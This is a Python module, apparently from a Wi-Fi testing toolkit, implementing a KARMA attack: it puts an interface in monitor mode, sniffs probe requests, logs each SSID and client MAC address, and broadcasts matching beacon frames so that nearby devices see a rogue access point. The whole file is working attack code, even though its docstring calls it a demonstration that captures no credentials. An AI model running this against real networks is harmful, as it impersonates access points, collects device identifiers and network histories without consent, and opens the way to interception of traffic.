"""KARMA attack - responds to any probe request with a matching AP.

Demonstrates how devices leak previously-connected SSIDs.
No credentials are captured or stored.
"""
import time
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp
from wifitest.logger import SessionLogger
from wifitest.adapter import enable_monitor_mode, disable_monitor_mode


def run_karma(logger: SessionLogger, interface: str, **kwargs) -> None:
    """Run KARMA mode: respond to probe requests with matching beacons."""
    mon_iface = enable_monitor_mode(interface)
    logger.event("karma_started", interface=mon_iface)

    seen_ssids = set()

    def _handle_probe(pkt):
        if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 4:
            ssid = pkt[Dot11Elt].info.decode("utf-8", errors="ignore")
            if ssid and ssid not in seen_ssids:
                seen_ssids.add(ssid)
                logger.event("probe_request_seen", ssid=ssid,
                             client=pkt.addr2)
                _send_beacon(mon_iface, ssid)

    try:
        from scapy.all import sniff
        sniff(iface=mon_iface, prn=_handle_probe, store=False)
    except KeyboardInterrupt:
        pass
    finally:
        disable_monitor_mode(mon_iface)
        logger.event("karma_stopped", unique_ssids=len(seen_ssids))


def _send_beacon(iface: str, ssid: str) -> None:
    """Send a beacon frame for the requested SSID."""
    try:
        radio = RadioTap()
        dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                      addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")
        beacon = Dot11Beacon(cap="ESS+privacy")
        elt = Dot11Elt(ID="SSID", info=ssid.encode())
        pkt = radio / dot11 / beacon / elt
        sendp(pkt, iface=iface, verbose=False, count=1)
    except Exception:
        pass
